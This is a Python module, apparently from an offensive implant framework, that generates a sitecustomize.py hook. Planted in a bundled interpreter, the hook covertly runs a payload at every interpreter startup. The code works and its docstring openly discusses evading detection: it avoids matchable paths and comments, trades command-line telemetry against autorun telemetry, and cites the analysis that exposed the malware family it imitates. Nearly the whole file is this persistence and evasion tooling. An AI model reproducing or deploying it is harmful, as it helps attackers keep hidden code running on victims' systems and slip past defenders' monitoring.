#!/usr/bin/env python3
"""The interpreter-level startup hook a brought-interpreter build carries.

One function, and it is the whole of this module: the text of a
`sitecustomize.py`. It lives here rather than in `server.py` because its
consumers are the generator and `tools/build_interpreter_bundle.py`, and
a command-line tool that assembles a zip should not have to import a web
application; and not in `beacon.py` because the beacon never needs it at
runtime and `beacon.py` is the one file the generator ships to a target.
"""

import re


def render_sitecustomize(payload_name: str, gate: str = "path") -> str:
    """The startup hook an interpreter bundle carries in its own `Lib/`.

    A `sitecustomize.py` there is imported by `site` at interpreter
    startup, before anything the command line named. The hook finds the
    payload from its own position -- two directories up from
    `Lib/sitecustomize.py` is the interpreter root, where the stager lays
    the payload beside the executable -- and runs it with
    `runpy.run_path`. Nothing in the emitted text is absolute, so there is
    no path in it for anybody to match on, and it carries no comments:
    what is written here ships verbatim to a target.

    **`gate="path"` is the default, and the reason is not cosmetic.**

    - `path` runs the payload whenever this interpreter starts. The
      autorun entry that starts it carries a plausible script path on its
      command line, which is unremarkable in an autorun inventory.
    - `argc` reads this process's own argument count through
      `ctypes.pythonapi.Py_GetArgcArgv` and runs the payload only when
      the interpreter was launched bare, so the autorun entry can name no
      payload at all.

    The `argc` shape buys invisibility in command-line telemetry and pays
    for it with an anomaly in process and autorun telemetry: an
    interpreter started with no arguments, which barely occurs
    legitimately. Per the published analysis this mechanism is derived
    from, that anomaly aggregated across endpoints is the lead that
    unravelled the family it came from. So `path` is the default and
    `argc` is for an engagement whose telemetry is the other way round.
    Flipping the default is cheap and is not an improvement.

    Two details that are decisions rather than accidents:

    The payload runs inline, not on a thread. A thread would let the
    script named on the command line run as well, and under the `path`
    gate that script is the payload -- so it would start twice. Inline
    also means that if the hook never runs (an `._pth` that does not
    import `site`, which the official Windows embeddable distribution
    ships), the `path` gate still works: the command line names the
    payload and the interpreter runs it.

    The hook arms once per process tree, guarded by an environment
    variable named after this build's payload. The payload starts
    `python -` children with this same interpreter to run its tunnel, and
    a hook that armed in those children would run the payload instead of
    the source waiting on their stdin, for ever.
    """
    if not re.match(r"^[A-Za-z0-9][A-Za-z0-9._-]*$", payload_name or ""):
        raise ValueError(
            "payload_name must be a plain file name made of letters, "
            "digits, dot, dash and underscore, not %r: the hook joins it "
            "to the interpreter's own directory" % (payload_name,))
    if gate not in ("path", "argc"):
        raise ValueError(
            "gate must be \"path\" or \"argc\", not %r" % (gate,))

    marker = re.sub(r"[^A-Za-z0-9]", "_", payload_name.split(".")[0]).upper()
    if gate == "argc":
        head = "import ctypes\nimport os\nimport runpy\n"
        setup = ("_c = ctypes.c_int()\n"
                 "_v = ctypes.POINTER(ctypes.c_wchar_p)()\n"
                 "try:\n"
                 "    ctypes.pythonapi.Py_GetArgcArgv("
                 "ctypes.byref(_c), ctypes.byref(_v))\n"
                 "    _bare = _c.value == 1\n"
                 "except Exception:\n"
                 "    _bare = False\n")
        condition = "_bare and "
    else:
        head = "import os\nimport runpy\n"
        setup = ""
        condition = ""

    return (
        "%s%s_m = %r\n"
        "_p = os.path.join(os.path.dirname(os.path.dirname("
        "os.path.abspath(__file__))), %r)\n"
        "if %snot os.environ.get(_m) and os.path.isfile(_p):\n"
        "    os.environ[_m] = \"1\"\n"
        "    try:\n"
        "        runpy.run_path(_p, run_name=\"__main__\")\n"
        "    except Exception:\n"
        "        pass\n"
        % (head, setup, marker, payload_name, condition))
